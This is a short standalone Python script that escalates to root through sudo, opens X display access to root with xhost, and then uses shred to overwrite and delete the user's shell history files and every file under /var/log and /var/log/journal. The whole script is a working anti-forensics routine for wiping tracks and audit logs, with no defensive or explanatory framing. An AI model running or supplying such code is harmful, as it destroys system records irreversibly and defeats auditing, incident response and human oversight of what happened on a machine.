import os
import sys
from pathlib import Path
import subprocess

def main():
    subprocess.run(['xhost', 'si:localuser:root'])

    if os.geteuid() != 0:
        os.execvp('sudo', ['sudo', sys.executable] + sys.argv)

    home_dir = str(Path.home())
    history_files = [
        os.path.join(home_dir, '.bash_history'),
        os.path.join(home_dir, '.zsh_history')
    ]

    found = False
    for hist_file in history_files:
        print(f"Checking: {hist_file}")
        if os.path.exists(hist_file):
            print(f"Shredding: {hist_file}")
            result = subprocess.run(['shred', '-u', '-z', '-n', '10', hist_file])
            print(f"shred exit code: {result.returncode}")
            found = True

    if not found:
        print("No history files found, please check manually.")

    log_dirs = ['/var/log', '/var/log/journal']
    log_files = []
    for log_dir in log_dirs:
        for root, dirs, files in os.walk(log_dir):
            for file in files:
                file_path = os.path.join(root, file)
                log_files.append(file_path)

    if not log_files:
        print("No log files found.")
    else:
        for log_file in log_files:
            print(f"Shredding: {log_file}")
            result = subprocess.run(['shred', '-u', '-z', '-n', '10', log_file])
            print(f"shred exit code: {result.returncode}")

if __name__ == "__main__":
    main()